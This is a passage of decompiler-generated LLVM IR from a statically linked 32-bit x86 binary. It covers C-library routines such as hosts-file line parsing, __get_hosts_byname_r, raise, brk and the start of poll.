  %v1_804c5db58 = phi i8* [ %v1_804c5db51, %dec_label_pc_804c5e5.lr.ph ], [ %v1_804c5db, %dec_label_pc_804c5da ]
  %v0_804c5da57 = phi i32 [ %v0_804c5db.pre, %dec_label_pc_804c5e5.lr.ph ], [ %v1_804c5da, %dec_label_pc_804c5da ]
  %v2_804c5e5 = sext i8 %v2_804c5db59 to i32
  store i32 %v2_804c5e5, i32* @edx, align 4
  store i32 %v0_804c5e8.pre, i32* @eax, align 4
  %v2_804c5ed = mul nsw i32 %v2_804c5e5, 2
  %v3_804c5ed = add i32 %v0_804c5e8.pre, %v2_804c5ed
  %v4_804c5ed = inttoptr i32 %v3_804c5ed to i8*
  %v5_804c5ed = load i8, i8* %v4_804c5ed, align 1
  %v6_804c5ed = and i8 %v5_804c5ed, 32
  %v7_804c5ed = icmp eq i8 %v6_804c5ed, 0
  %v1_804c5f1 = icmp eq i1 %v7_804c5ed, false
  br i1 %v1_804c5f1, label %dec_label_pc_804c5da, label %dec_label_pc_804c5f3

dec_label_pc_804c5f3:                             ; preds = %dec_label_pc_804c5e5
  %v10_804c5f3 = icmp eq i8 %v2_804c5db59, 10
  br i1 %v10_804c5f3, label %dec_label_pc_804c74e.backedge, label %dec_label_pc_804c5fc

dec_label_pc_804c74e.backedge:                    ; preds = %dec_label_pc_804c5db.preheader, %dec_label_pc_804c5da, %dec_label_pc_804c714, %dec_label_pc_804c743, %dec_label_pc_804c71b, %dec_label_pc_804c5f3, %dec_label_pc_804c5fc, %dec_label_pc_804c6cd
  %v0_804c74e = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_804c755, i32* @ebx, align 4
  %v3_804c75a = call i32 @fgets(i32 %v2_804c755, i32 128, i32 %v0_804c74e)
  store i32 %v3_804c75a, i32* @eax, align 4
  %v1_804c762 = icmp eq i32 %v3_804c75a, 0
  %v1_804c764 = icmp eq i1 %v1_804c762, false
  br i1 %v1_804c764, label %dec_label_pc_804c5db.preheader, label %dec_label_pc_804c76a

dec_label_pc_804c5fc:                             ; preds = %dec_label_pc_804c5f3
  %v10_804c604 = icmp eq i8 %v2_804c5db59, 35
  %v1_804c607 = icmp eq i1 %v10_804c604, false
  br i1 %v1_804c607, label %dec_label_pc_804c658.preheader, label %dec_label_pc_804c74e.backedge

dec_label_pc_804c658.preheader:                   ; preds = %dec_label_pc_804c5fc
  %v2_804c6586 = load i8, i8* %v1_804c5db58, align 1
  %v3_804c6587 = icmp eq i8 %v2_804c6586, 0
  br i1 %v3_804c6587, label %dec_label_pc_804c664, label %dec_label_pc_804c65d

dec_label_pc_804c60e:                             ; preds = %dec_label_pc_804c65d
  store i32 %stack_var_-196.013, i32* @eax, align 4
  %v1_804c612 = load i32, i32* @esp, align 4
  %v3_804c612 = mul nuw nsw i32 %stack_var_-196.013, 4
  %v4_804c612 = add nuw nsw i32 %v3_804c612, 152
  %v5_804c612 = add i32 %v4_804c612, %v1_804c612
  %v6_804c612 = inttoptr i32 %v5_804c612 to i32*
  store i32 %v0_804c612, i32* %v6_804c612, align 4
  %v0_804c61c.pre = load i32, i32* @ebx, align 4
  %v4_804c61c.pre = load i32, i32* @ecx, align 4
  %v1_804c61c61 = inttoptr i32 %v0_804c61c.pre to i8*
  %v2_804c61c62 = load i8, i8* %v1_804c61c61, align 1
  %v3_804c61c63 = zext i8 %v2_804c61c62 to i32
  %v5_804c61c64 = and i32 %v4_804c61c.pre, -256
  %v6_804c61c65 = or i32 %v3_804c61c63, %v5_804c61c64
  %v4_804c61e66 = icmp eq i8 %v2_804c61c62, 0
  br i1 %v4_804c61e66, label %dec_label_pc_804c63b.preheader, label %dec_label_pc_804c622.lr.ph

dec_label_pc_804c622.lr.ph:                       ; preds = %dec_label_pc_804c60e
  %v0_804c625.pre = load i32, i32* @global_var_8052038, align 8
  br label %dec_label_pc_804c622

dec_label_pc_804c61b:                             ; preds = %dec_label_pc_804c630
  %v1_804c61b = add i32 %v0_804c61b67, 1
  store i32 %v1_804c61b, i32* @ebx, align 4
  %v1_804c61c = inttoptr i32 %v1_804c61b to i8*
  %v2_804c61c = load i8, i8* %v1_804c61c, align 1
  %v3_804c61c = zext i8 %v2_804c61c to i32
  %v5_804c61c = and i32 %v6_804c61c69, -256
  %v6_804c61c = or i32 %v3_804c61c, %v5_804c61c
  %v4_804c61e = icmp eq i8 %v2_804c61c, 0
  br i1 %v4_804c61e, label %dec_label_pc_804c63b.preheader, label %dec_label_pc_804c622

dec_label_pc_804c622:                             ; preds = %dec_label_pc_804c622.lr.ph, %dec_label_pc_804c61b
  %v6_804c61c69 = phi i32 [ %v6_804c61c65, %dec_label_pc_804c622.lr.ph ], [ %v6_804c61c, %dec_label_pc_804c61b ]
  %v2_804c61c68 = phi i8 [ %v2_804c61c62, %dec_label_pc_804c622.lr.ph ], [ %v2_804c61c, %dec_label_pc_804c61b ]
  %v0_804c61b67 = phi i32 [ %v0_804c61c.pre, %dec_label_pc_804c622.lr.ph ], [ %v1_804c61b, %dec_label_pc_804c61b ]
  %v2_804c622 = sext i8 %v2_804c61c68 to i32
  store i32 %v2_804c622, i32* @edx, align 4
  store i32 %v0_804c625.pre, i32* @eax, align 4
  %v2_804c62a = mul nsw i32 %v2_804c622, 2
  %v3_804c62a = add i32 %v0_804c625.pre, %v2_804c62a
  %v4_804c62a = inttoptr i32 %v3_804c62a to i8*
  %v5_804c62a = load i8, i8* %v4_804c62a, align 1
  %v6_804c62a = and i8 %v5_804c62a, 32
  %v7_804c62a = icmp eq i8 %v6_804c62a, 0
  %v1_804c62e = icmp eq i1 %v7_804c62a, false
  br i1 %v1_804c62e, label %dec_label_pc_804c63b.preheader, label %dec_label_pc_804c630

dec_label_pc_804c630:                             ; preds = %dec_label_pc_804c622
  %v10_804c630 = icmp eq i8 %v2_804c61c68, 10
  %v1_804c633 = icmp eq i1 %v10_804c630, false
  br i1 %v1_804c633, label %dec_label_pc_804c61b, label %dec_label_pc_804c63b.preheader

dec_label_pc_804c63b.preheader:                   ; preds = %dec_label_pc_804c630, %dec_label_pc_804c622, %dec_label_pc_804c61b, %dec_label_pc_804c60e
  %v0_804c61b.lcssa = phi i32 [ %v0_804c61c.pre, %dec_label_pc_804c60e ], [ %v1_804c61b, %dec_label_pc_804c61b ], [ %v0_804c61b67, %dec_label_pc_804c622 ], [ %v0_804c61b67, %dec_label_pc_804c630 ]
  %v6_804c61c.lcssa = phi i32 [ %v6_804c61c65, %dec_label_pc_804c60e ], [ %v6_804c61c, %dec_label_pc_804c61b ], [ %v6_804c61c69, %dec_label_pc_804c622 ], [ %v6_804c61c69, %dec_label_pc_804c630 ]
  %v1_804c63b75 = inttoptr i32 %v0_804c61b.lcssa to i8*
  %v2_804c63b76 = load i8, i8* %v1_804c63b75, align 1
  %v3_804c63b77 = zext i8 %v2_804c63b76 to i32
  %v5_804c63b78 = and i32 %v6_804c61c.lcssa, -256
  %v6_804c63b79 = or i32 %v3_804c63b77, %v5_804c63b78
  store i32 %v6_804c63b79, i32* @ecx, align 4
  %v4_804c63d80 = icmp eq i8 %v2_804c63b76, 0
  br i1 %v4_804c63d80, label %dec_label_pc_804c654, label %dec_label_pc_804c641

dec_label_pc_804c637:                             ; preds = %dec_label_pc_804c64f, %dec_label_pc_804c641
  store i8 0, i8* %v1_804c63b82, align 1
  %v0_804c63a = load i32, i32* @ebx, align 4
  %v1_804c63a = add i32 %v0_804c63a, 1
  store i32 %v1_804c63a, i32* @ebx, align 4
  %v4_804c63b.pre = load i32, i32* @ecx, align 4
  %v1_804c63b = inttoptr i32 %v1_804c63a to i8*
  %v2_804c63b = load i8, i8* %v1_804c63b, align 1
  %v3_804c63b = zext i8 %v2_804c63b to i32
  %v5_804c63b = and i32 %v4_804c63b.pre, -256
  %v6_804c63b = or i32 %v3_804c63b, %v5_804c63b
  store i32 %v6_804c63b, i32* @ecx, align 4
  %v4_804c63d = icmp eq i8 %v2_804c63b, 0
  br i1 %v4_804c63d, label %dec_label_pc_804c654, label %dec_label_pc_804c641

dec_label_pc_804c641:                             ; preds = %dec_label_pc_804c63b.preheader, %dec_label_pc_804c637
  %v2_804c63b83 = phi i8 [ %v2_804c63b, %dec_label_pc_804c637 ], [ %v2_804c63b76, %dec_label_pc_804c63b.preheader ]
  %v1_804c63b82 = phi i8* [ %v1_804c63b, %dec_label_pc_804c637 ], [ %v1_804c63b75, %dec_label_pc_804c63b.preheader ]
  %v0_804c65881 = phi i32 [ %v1_804c63a, %dec_label_pc_804c637 ], [ %v0_804c61b.lcssa, %dec_label_pc_804c63b.preheader ]
  %v2_804c641 = sext i8 %v2_804c63b83 to i32
  store i32 %v2_804c641, i32* @edx, align 4
  %v0_804c644 = load i32, i32* @global_var_8052038, align 8
  store i32 %v0_804c644, i32* @eax, align 4
  %v2_804c649 = mul nsw i32 %v2_804c641, 2
  %v3_804c649 = add i32 %v0_804c644, %v2_804c649
  %v4_804c649 = inttoptr i32 %v3_804c649 to i8*
  %v5_804c649 = load i8, i8* %v4_804c649, align 1
  %v6_804c649 = and i8 %v5_804c649, 32
  %v7_804c649 = icmp eq i8 %v6_804c649, 0
  %v1_804c64d = icmp eq i1 %v7_804c649, false
  br i1 %v1_804c64d, label %dec_label_pc_804c637, label %dec_label_pc_804c64f

dec_label_pc_804c64f:                             ; preds = %dec_label_pc_804c641
  %v10_804c64f = icmp eq i8 %v2_804c63b83, 10
  br i1 %v10_804c64f, label %dec_label_pc_804c637, label %dec_label_pc_804c654

dec_label_pc_804c654:                             ; preds = %dec_label_pc_804c637, %dec_label_pc_804c64f, %dec_label_pc_804c63b.preheader
  %v0_804c658.lcssa = phi i32 [ %v0_804c61b.lcssa, %dec_label_pc_804c63b.preheader ], [ %v0_804c65881, %dec_label_pc_804c64f ], [ %v1_804c63a, %dec_label_pc_804c637 ]
  %v1_804c63b.lcssa = phi i8* [ %v1_804c63b75, %dec_label_pc_804c63b.preheader ], [ %v1_804c63b82, %dec_label_pc_804c64f ], [ %v1_804c63b, %dec_label_pc_804c637 ]
  %v4_804c654 = add nuw nsw i32 %stack_var_-196.013, 1
  %v2_804c658 = load i8, i8* %v1_804c63b.lcssa, align 1
  %v3_804c658 = icmp eq i8 %v2_804c658, 0
  br i1 %v3_804c658, label %dec_label_pc_804c664, label %dec_label_pc_804c65d

dec_label_pc_804c65d:                             ; preds = %dec_label_pc_804c658.preheader, %dec_label_pc_804c654
  %v0_804c612 = phi i32 [ %v0_804c658.lcssa, %dec_label_pc_804c654 ], [ %v0_804c5da57, %dec_label_pc_804c658.preheader ]
  %stack_var_-196.013 = phi i32 [ %v4_804c654, %dec_label_pc_804c654 ], [ 0, %dec_label_pc_804c658.preheader ]
  %v7_804c662 = icmp sgt i32 %stack_var_-196.013, 4
  br i1 %v7_804c662, label %dec_label_pc_804c664, label %dec_label_pc_804c60e

dec_label_pc_804c664:                             ; preds = %dec_label_pc_804c654, %dec_label_pc_804c65d, %dec_label_pc_804c658.preheader
  %stack_var_-196.0.lcssa = phi i32 [ 0, %dec_label_pc_804c658.preheader ], [ %v4_804c654, %dec_label_pc_804c654 ], [ %stack_var_-196.013, %dec_label_pc_804c65d ]
  store i32 %tmp, i32* @edi, align 4
  %v0_804c66b = load i32, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_80505f5.92 to i32), i32* %stack_var_-216, align 4
  %v5_804c673 = call i32 @__GI_strcoll(i8* %v4_804c673, i32 ptrtoint ([11 x i8]* @global_var_80505f5.92 to i32), i32 %v0_804c66b, i32 %v0_804c66b)
  store i32 %v5_804c673, i32* @eax, align 4
  store i32 1, i32* @esi, align 4
  %v1_804c680 = icmp eq i32 %v5_804c673, 0
  br i1 %v1_804c680, label %dec_label_pc_804c6a8.preheader, label %dec_label_pc_804c6b9

dec_label_pc_804c6a8.preheader:                   ; preds = %dec_label_pc_804c664
  %v5_804c6ac90 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_804c6ac90, label %dec_label_pc_804c6ae.lr.ph, label %dec_label_pc_804c6b9

dec_label_pc_804c6ae.lr.ph:                       ; preds = %dec_label_pc_804c6a8.preheader
  %v0_804c6ae.pre = load i32, i32* @global_var_8054994.33, align 4
  br label %dec_label_pc_804c6ae

dec_label_pc_804c686:                             ; preds = %dec_label_pc_804c6ae
  %v2_804c689 = mul i32 %v1_804c68991, 4
  %v4_804c689 = add i32 %v2_804c689, %v3_804c689
  %v5_804c689 = inttoptr i32 %v4_804c689 to i32*
  %v6_804c689 = load i32, i32* %v5_804c689, align 4
  %v1_804c690 = inttoptr i32 %v6_804c689 to i8*
  %v2_804c690 = call i32 @__GI_strdup(i8* %v1_804c690)
  %v0_804c695 = load i32, i32* @esi, align 4
  %v1_804c695 = add i32 %v0_804c695, 1
  store i32 %v1_804c695, i32* @esi, align 4
  %v1_804c696 = load i32, i32* @ebx, align 4
  %v2_804c696 = mul i32 %v1_804c696, 4
  %v3_804c696 = add i32 %v2_804c696, 134564232
  %v4_804c696 = inttoptr i32 %v3_804c696 to i32*
  store i32 %v2_804c690, i32* %v4_804c696, align 4
  %v0_804c69d = load i32, i32* @ebx, align 4
  %v1_804c69d = add i32 %v0_804c69d, 1
  store i32 %v1_804c69d, i32* @eax, align 4
  store i32 %v1_804c69d, i32* @global_var_8054994.33, align 4
  %v0_804c6a8.pre = load i32, i32* @esi, align 4
  %v5_804c6ac = icmp slt i32 %v0_804c6a8.pre, %stack_var_-196.0.lcssa
  br i1 %v5_804c6ac, label %dec_label_pc_804c6ae, label %dec_label_pc_804c6b9

dec_label_pc_804c6ae:                             ; preds = %dec_label_pc_804c6ae.lr.ph, %dec_label_pc_804c686
  %v0_804c6ae = phi i32 [ %v0_804c6ae.pre, %dec_label_pc_804c6ae.lr.ph ], [ %v1_804c69d, %dec_label_pc_804c686 ]
  %v1_804c68991 = phi i32 [ 1, %dec_label_pc_804c6ae.lr.ph ], [ %v0_804c6a8.pre, %dec_label_pc_804c686 ]
  store i32 %v0_804c6ae, i32* @ebx, align 4
  %v7_804c6b7 = icmp sgt i32 %v0_804c6ae, 2
  br i1 %v7_804c6b7, label %dec_label_pc_804c6b9, label %dec_label_pc_804c686

dec_label_pc_804c6b9:                             ; preds = %dec_label_pc_804c6a8.preheader, %dec_label_pc_804c686, %dec_label_pc_804c6ae, %dec_label_pc_804c664
  %v0_804c6b9 = load i32, i32* @ebx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_8050600.93 to i32), i32* %stack_var_-216, align 4
  %v0_804c6c0 = load i32, i32* @edi, align 4
  %v4_804c6c1 = inttoptr i32 %v0_804c6c0 to i8*
  %v5_804c6c1 = call i32 @__GI_strcoll(i8* %v4_804c6c1, i32 ptrtoint ([7 x i8]* @global_var_8050600.93 to i32), i32 %v0_804c6b9, i32 %v0_804c6b9)
  store i32 %v5_804c6c1, i32* @eax, align 4
  %v1_804c6c9 = icmp eq i32 %v5_804c6c1, 0
  br i1 %v1_804c6c9, label %dec_label_pc_804c70b.preheader, label %dec_label_pc_804c6cd

dec_label_pc_804c6cd:                             ; preds = %dec_label_pc_804c6b9
  %v0_804c6cd = load i32, i32* @ecx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_8050607.94 to i32), i32* %stack_var_-216, align 4
  %v0_804c6d4 = load i32, i32* @edi, align 4
  %v4_804c6d5 = inttoptr i32 %v0_804c6d4 to i8*
  %v5_804c6d5 = call i32 @__GI_strcoll(i8* %v4_804c6d5, i32 ptrtoint ([7 x i8]* @global_var_8050607.94 to i32), i32 %v0_804c6cd, i32 %v0_804c6cd)
  %v1_804c6dd = icmp eq i32 %v5_804c6d5, 0
  br i1 %v1_804c6dd, label %dec_label_pc_804c70b.preheader, label %dec_label_pc_804c74e.backedge

dec_label_pc_804c70b.preheader:                   ; preds = %dec_label_pc_804c6b9, %dec_label_pc_804c6cd
  %v0_804c70b92 = load i32, i32* @global_var_8054998.87, align 8
  %tmp4594 = icmp slt i32 %v0_804c70b92, 1
  %tmp4695 = icmp eq i1 %tmp4594, false
  br i1 %tmp4695, label %dec_label_pc_804c6e3, label %dec_label_pc_804c714

dec_label_pc_804c6e3:                             ; preds = %dec_label_pc_804c70b.preheader, %dec_label_pc_804c6e3.dec_label_pc_804c6e3_crit_edge
  %v0_804c70b96 = phi i32 [ %v0_804c70b, %dec_label_pc_804c6e3.dec_label_pc_804c6e3_crit_edge ], [ %v0_804c70b92, %dec_label_pc_804c70b.preheader ]
  %v1_804c6e3 = add i32 %v0_804c70b96, -1
  store i32 %v1_804c6e3, i32* @global_var_8054998.87, align 8
  %v1_804c6ec = mul i32 %v1_804c6e3, 4
  %v2_804c6ec = add i32 %v1_804c6ec, 134564216
  %v3_804c6ec = inttoptr i32 %v2_804c6ec to i32*
  %v4_804c6ec = load i32, i32* %v3_804c6ec, align 4
  %v1_804c6f3 = call i32 @free(i32 %v4_804c6ec)
  %v0_804c6f8 = load i32, i32* @global_var_8054998.87, align 8
  %v1_804c700 = mul i32 %v0_804c6f8, 4
  %v2_804c700 = add i32 %v1_804c700, ptrtoint (i32* @global_var_8054978.95 to i32)
  %v3_804c700 = inttoptr i32 %v2_804c700 to i32*
  store i32 0, i32* %v3_804c700, align 4
  %v0_804c70b = load i32, i32* @global_var_8054998.87, align 8
  %tmp45 = icmp slt i32 %v0_804c70b, 1
  %tmp46 = icmp eq i1 %tmp45, false
  br i1 %tmp46, label %dec_label_pc_804c6e3.dec_label_pc_804c6e3_crit_edge, label %dec_label_pc_804c714

dec_label_pc_804c6e3.dec_label_pc_804c6e3_crit_edge: ; preds = %dec_label_pc_804c6e3
  br label %dec_label_pc_804c6e3

dec_label_pc_804c714:                             ; preds = %dec_label_pc_804c6e3, %dec_label_pc_804c70b.preheader
  %v0_804c70b.lcssa = phi i32 [ %v0_804c70b92, %dec_label_pc_804c70b.preheader ], [ %v0_804c70b, %dec_label_pc_804c6e3 ]
  store i32 1, i32* @esi, align 4
  %v5_804c741100 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_804c741100, label %dec_label_pc_804c743, label %dec_label_pc_804c74e.backedge

dec_label_pc_804c71b:                             ; preds = %dec_label_pc_804c743
  %v2_804c71e = mul i32 %v1_804c71e102, 4
  %v4_804c71e = add i32 %v2_804c71e, %v3_804c689
  %v5_804c71e = inttoptr i32 %v4_804c71e to i32*
  %v6_804c71e = load i32, i32* %v5_804c71e, align 4
  %v1_804c725 = inttoptr i32 %v6_804c71e to i8*
  %v2_804c725 = call i32 @__GI_strdup(i8* %v1_804c725)
  %v0_804c72a = load i32, i32* @esi, align 4
  %v1_804c72a = add i32 %v0_804c72a, 1
  store i32 %v1_804c72a, i32* @esi, align 4
  %v1_804c72b = load i32, i32* @ebx, align 4
  %v2_804c72b = mul i32 %v1_804c72b, 4
  %v3_804c72b = add i32 %v2_804c72b, 134564216
  %v4_804c72b = inttoptr i32 %v3_804c72b to i32*
  store i32 %v2_804c725, i32* %v4_804c72b, align 4
  %v0_804c732 = load i32, i32* @ebx, align 4
  %v1_804c732 = add i32 %v0_804c732, 1
  store i32 %v1_804c732, i32* @global_var_8054998.87, align 8
  %v0_804c73d.pre = load i32, i32* @esi, align 4
  %v5_804c741 = icmp slt i32 %v0_804c73d.pre, %stack_var_-196.0.lcssa
  br i1 %v5_804c741, label %dec_label_pc_804c743, label %dec_label_pc_804c74e.backedge

dec_label_pc_804c743:                             ; preds = %dec_label_pc_804c714, %dec_label_pc_804c71b
  %v1_804c71e102 = phi i32 [ %v0_804c73d.pre, %dec_label_pc_804c71b ], [ 1, %dec_label_pc_804c714 ]
  %v0_804c743101 = phi i32 [ %v1_804c732, %dec_label_pc_804c71b ], [ %v0_804c70b.lcssa, %dec_label_pc_804c714 ]
  store i32 %v0_804c743101, i32* @ebx, align 4
  %v7_804c74c = icmp sgt i32 %v0_804c743101, 3
  br i1 %v7_804c74c, label %dec_label_pc_804c74e.backedge, label %dec_label_pc_804c71b

dec_label_pc_804c5db.preheader:                   ; preds = %dec_label_pc_804c5db.preheader.lr.ph, %dec_label_pc_804c74e.backedge
  %v0_804c5db.pre = load i32, i32* @ebx, align 4
  %v4_804c5db.pre = load i32, i32* @ecx, align 4
  %v1_804c5db51 = inttoptr i32 %v0_804c5db.pre to i8*
  %v2_804c5db52 = load i8, i8* %v1_804c5db51, align 1
  %v3_804c5db53 = zext i8 %v2_804c5db52 to i32
  %v5_804c5db54 = and i32 %v4_804c5db.pre, -256
  %v6_804c5db55 = or i32 %v3_804c5db53, %v5_804c5db54
  store i32 %v6_804c5db55, i32* @ecx, align 4
  %v4_804c5dd56 = icmp eq i8 %v2_804c5db52, 0
  br i1 %v4_804c5dd56, label %dec_label_pc_804c74e.backedge, label %dec_label_pc_804c5e5.lr.ph

dec_label_pc_804c5e5.lr.ph:                       ; preds = %dec_label_pc_804c5db.preheader
  %v0_804c5e8.pre = load i32, i32* @global_var_8052038, align 8
  br label %dec_label_pc_804c5e5

dec_label_pc_804c76a:                             ; preds = %dec_label_pc_804c74e.backedge, %dec_label_pc_804c74e.preheader
  %v0_804c76d = load i32, i32* @ebp, align 4
  %v1_804c76e = inttoptr i32 %v0_804c76d to i16*
  %v2_804c76e = call i32 @__GI_fclose(i16* %v1_804c76e)
  br label %dec_label_pc_804c783

dec_label_pc_804c778:                             ; preds = %dec_label_pc_804c5b7
  %v0_804c778 = call i32 @__GI___h_errno_location()
  %v1_804c77d = inttoptr i32 %v0_804c778 to i32*
  store i32 3, i32* %v1_804c77d, align 4
  br label %dec_label_pc_804c783

dec_label_pc_804c783:                             ; preds = %entry, %dec_label_pc_804c76a, %dec_label_pc_804c778
  store i32 1, i32* %stack_var_-216, align 4
  store i32 %v2_804c570, i32* @eax, align 4
  %v2_804c78f = call i32 @__pthread_return_void(i32 %v2_804c570, i32 1)
  store i32 %v0_804c55c, i32* @ebp, align 4
  ret i32 %v2_804c78f

; uselistorder directives
  uselistorder i32 %v0_804c5e8.pre, { 1, 0 }
  uselistorder i32 %v6_804c5db55, { 1, 0 }
  uselistorder i8 %v2_804c5db52, { 1, 2, 0 }
  uselistorder i8* %v1_804c5db51, { 1, 0 }
  uselistorder i32 %v0_804c5db.pre, { 1, 0 }
  uselistorder i32 %v0_804c70b, { 0, 2, 1 }
  uselistorder i32 %v1_804c6e3, { 1, 0 }
  uselistorder i32 %v0_804c6ae, { 1, 0 }
  uselistorder i32 %v0_804c6a8.pre, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.lcssa, { 3, 1, 2, 0 }
  uselistorder i32 %stack_var_-196.013, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_804c641, { 1, 0 }
  uselistorder i8 %v2_804c63b83, { 1, 0 }
  uselistorder i32 %v2_804c622, { 1, 0 }
  uselistorder i8 %v2_804c61c68, { 1, 0 }
  uselistorder i32 %v1_804c61b, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804c5e5, { 1, 0 }
  uselistorder i32 %v1_804c5da, { 1, 0, 2 }
  uselistorder i32 %v2_804c755, { 2, 3, 0, 1 }
  uselistorder i32 %v2_804c5c3, { 1, 0 }
  uselistorder i32 %v2_804c5a5, { 1, 0, 2 }
  uselistorder i32* %stack_var_-216, { 1, 3, 4, 5, 2, 0, 6, 7, 9, 8 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 ()* @__GI___h_errno_location, { 5, 4, 3, 2, 0, 1 }
  uselistorder i32* @global_var_8054998.87, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 152, { 1, 0, 2, 3 }
  uselistorder i32 164, { 1, 0 }
  uselistorder i32* @global_var_8054994.33, { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8052160.32 to i32), { 1, 3, 4, 5, 6, 7, 8, 0, 2, 9 }
  uselistorder label %dec_label_pc_804c783, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804c5db.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804c743, { 1, 0 }
  uselistorder label %dec_label_pc_804c6e3, { 1, 0 }
  uselistorder label %dec_label_pc_804c70b.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804c6b9, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_804c6ae, { 1, 0 }
  uselistorder label %dec_label_pc_804c664, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804c65d, { 1, 0 }
  uselistorder label %dec_label_pc_804c654, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804c641, { 1, 0 }
  uselistorder label %dec_label_pc_804c622, { 1, 0 }
  uselistorder label %dec_label_pc_804c74e.backedge, { 0, 3, 4, 2, 7, 6, 5, 1 }
  uselistorder label %dec_label_pc_804c74e.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v9_804c7c3 = inttoptr i32 %arg3 to i32*
  %v10_804c7c3 = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_804c7c3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7)
  ret i32 %v10_804c7c3
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804c7cf = call i32 @__libc_getpid()
  %v2_804c7db = call i32 @kill(i32 %v0_804c7cf, i32 %arg1)
  ret i32 %v2_804c7db

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 0, 2, 1 }
  uselistorder i32 ()* @__libc_getpid, { 1, 3, 2, 0 }
}

define i32 @_dl_aux_init() local_unnamed_addr {
entry:
  %v0_804c7e4 = load i32, i32* @eax, align 4
  %v1_804c7e4 = add i32 %v0_804c7e4, 28
  %v2_804c7e4 = inttoptr i32 %v1_804c7e4 to i32*
  %v3_804c7e4 = load i32, i32* %v2_804c7e4, align 4
  store i32 %v3_804c7e4, i32* @global_var_805499c.96, align 4
  %v1_804c7ed = add i32 %v0_804c7e4, 44
  %v2_804c7ed = inttoptr i32 %v1_804c7ed to i32*
  %v3_804c7ed = load i32, i32* %v2_804c7ed, align 4
  store i32 %v3_804c7ed, i32* @global_var_80549a0.97, align 32
  ret i32 %v3_804c7ed
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804c7f8 = load i32, i32* @ebx, align 4
  store i32 %v0_804c7f8, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_804c80b = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_804c80b, i32* @global_var_8052544.82, align 4
  %v7_804c816 = icmp ult i32 %v1_804c80b, %arg1
  %v1_804c818 = icmp eq i1 %v7_804c816, false
  br i1 %v1_804c818, label %dec_label_pc_804c828, label %dec_label_pc_804c81a

dec_label_pc_804c81a:                             ; preds = %entry
  %v0_804c81a = load i32, i32* %stack_var_-4, align 4
  %v1_804c81a = call i32 @__errno_location(i32 %v0_804c81a)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_804c822 = inttoptr i32 %v1_804c81a to i32*
  store i32 12, i32* %v1_804c822, align 4
  %v0_804c828.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804c828

dec_label_pc_804c828:                             ; preds = %entry, %dec_label_pc_804c81a
  %v0_804c828 = phi i32 [ 0, %entry ], [ %v0_804c828.pre, %dec_label_pc_804c81a ]
  %v2_804c82c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804c82c, i32* @ebx, align 4
  ret i32 %v0_804c828

; uselistorder directives
  uselistorder i32 %v1_804c80b, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32* @global_var_8052544.82, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804c828, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_804c833 = load i32, i32* @eax, align 4
  %v1_804c835 = sub i32 0, %v0_804c833
  %v1_804c837 = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v2_804c83c = inttoptr i32 %v1_804c837 to i32*
  store i32 %v1_804c835, i32* %v2_804c83c, align 4
  ret i32 -1
}

define i32 @__libc_poll() local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804c848 = load i32, i32* @edi, align 4
  store i32 %v0_804c848, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %edi.global-to-local, align 4
  %v0_804c858 = load i32, i32* @ebx, align 4
  %v1_804c859 = inttoptr i32 %tmp4 to %pollfd*
  %v5_804c860 = call i32 @poll(%pollfd* %v1_804c859, i32 %tmp3, i32 %tmp)
  store i32 %v0_804c858, i32* @ebx, align 4
  store i32 %v5_804c860, i32* %edi.global-to-local, align 4
  %tmp10 = icmp ult i32 %v5_804c860, -4095
  br i1 %tmp10, label %dec_label_pc_804c878, label %dec_label_pc_804c86c

dec_label_pc_804c86c:                             ; preds = %entry
  %v1_804c86c = call i32 @__errno_location(i32 %v0_804c858)
  %v0_804c871 = load i32, i32* %edi.global-to-local, align 4
  %v1_804c871 = sub i32 0, %v0_804c871
  %v2_804c873 = inttoptr i32 %v1_804c86c to i32*
  store i32 %v1_804c871, i32* %v2_804c873, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804c878

dec_label_pc_804c878:                             ; preds = %entry, %dec_label_pc_804c86c
